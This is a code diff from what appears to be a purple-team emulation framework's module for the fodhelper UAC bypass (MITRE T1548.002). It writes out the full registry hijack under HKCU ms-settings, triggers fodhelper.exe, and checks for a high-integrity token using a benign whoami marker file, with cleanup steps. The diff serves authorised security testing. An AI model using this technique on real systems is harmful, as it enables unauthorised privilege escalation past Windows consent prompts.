@@ -18,32 +18,41 @@ async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
         conn = await get_connection(target)
         if method == "fodhelper":
             setup_results = []
-            setup_results.append(await conn.run_ps(
-                "if (Test-Path -LiteralPath 'HKCU:\\Software\\Classes\\ms-settings') "
-                "{ throw 'Existing ms-settings registration will not be overwritten' }; "
-                "New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings'"
-                " -Force | Out-Null"
-            ))
+            setup_results.append(
+                await conn.run_ps(
+                    "if (Test-Path -LiteralPath 'HKCU:\\Software\\Classes\\ms-settings') "
+                    "{ throw 'Existing ms-settings registration will not be overwritten' }; "
+                    "New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings'"
+                    " -Force | Out-Null"
+                )
+            )
             if not setup_results[0].success:
                 raise RuntimeError(command_error(setup_results[0]))
             _created_targets.add(target)
-            setup_results.append(await conn.run_ps(
-                "New-Item -Path "
-                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
-                " -Force | Out-Null"
-            ))
-            setup_results.append(await conn.run_ps(
-                "New-ItemProperty -Path "
-                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
-                " -Name 'DelegateExecute' -Value '' -PropertyType String "
-                "-Force | Out-Null"
-            ))
-            setup_results.append(await conn.run_ps(
-                "New-ItemProperty -Path "
-                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
-                " -Name '(Default)' -Value 'cmd.exe /c echo UAC_BYPASS_TEST' "
-                "-PropertyType String -Force | Out-Null"
-            ))
+            setup_results.append(
+                await conn.run_ps(
+                    "New-Item -Path "
+                    "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
+                    " -Force | Out-Null"
+                )
+            )
+            setup_results.append(
+                await conn.run_ps(
+                    "New-ItemProperty -Path "
+                    "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
+                    " -Name 'DelegateExecute' -Value '' -PropertyType String "
+                    "-Force | Out-Null"
+                )
+            )
+            setup_results.append(
+                await conn.run_ps(
+                    "New-ItemProperty -Path "
+                    "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
+                    " -Name '(Default)' -Value 'cmd.exe /d /c \"whoami /groups > "
+                    "%TEMP%\\purplestrike_uac_integrity.txt 2>&1\"' "
+                    "-PropertyType String -Force | Out-Null"
+                )
+            )
             failed = next((result for result in setup_results if not result.success), None)
             if failed is not None:
                 return TechniqueResult(
@@ -67,16 +76,28 @@ async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
                     execution_status=ExecutionStatus.FAILURE,
                 )
             trigger = await conn.run_ps(
+                "$marker = Join-Path $env:TEMP 'purplestrike_uac_integrity.txt'; "
+                "[IO.File]::Delete($marker); "
                 "Start-Process 'fodhelper.exe' -WindowStyle Hidden; "
-                "Start-Sleep -Seconds 2; "
-                "'fodhelper.exe launched with UAC bypass registry'"
+                "for ($i=0; $i -lt 20 -and !(Test-Path -LiteralPath $marker); $i++) "
+                "{ Start-Sleep -Milliseconds 250 }; "
+                "if (!(Test-Path -LiteralPath $marker)) { "
+                "throw 'Elevated child did not create its integrity marker' }; "
+                "$content = Get-Content -LiteralPath $marker -Raw; "
+                "if ($content -notmatch 'S-1-16-12288|High Mandatory Level') { "
+                "throw 'Child process did not report a high-integrity token' }; "
+                "'High-integrity child token verified'"
             )
             return TechniqueResult(
                 technique_id="T1548.002",
                 success=trigger.success,
                 output=verify.stdout[:2048] + "\n" + trigger.stdout[:2048],
                 error=trigger.stderr[:1024] if not trigger.success else None,
-                execution_status=ExecutionStatus.SUCCESS if trigger.success else ExecutionStatus.FAILURE,
+                execution_status=ExecutionStatus.SUCCESS
+                if trigger.success
+                else ExecutionStatus.FAILURE,
+                artifacts=["%TEMP%\\purplestrike_uac_integrity.txt"],
+                evidence=["The fodhelper child reported a high-integrity token."],
             )
         return TechniqueResult(
             technique_id="T1548.002",
@@ -106,7 +127,9 @@ async def cleanup(target: str) -> None:
         conn = await get_connection(target)
         result = await conn.run_ps(
             "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' "
-            "-Recurse -Force -ErrorAction SilentlyContinue"
+            "-Recurse -Force -ErrorAction SilentlyContinue; "
+            "Remove-Item -LiteralPath (Join-Path $env:TEMP "
+            "'purplestrike_uac_integrity.txt') -Force -ErrorAction SilentlyContinue"
         )
         if not result.success:
             raise RuntimeError(command_error(result))
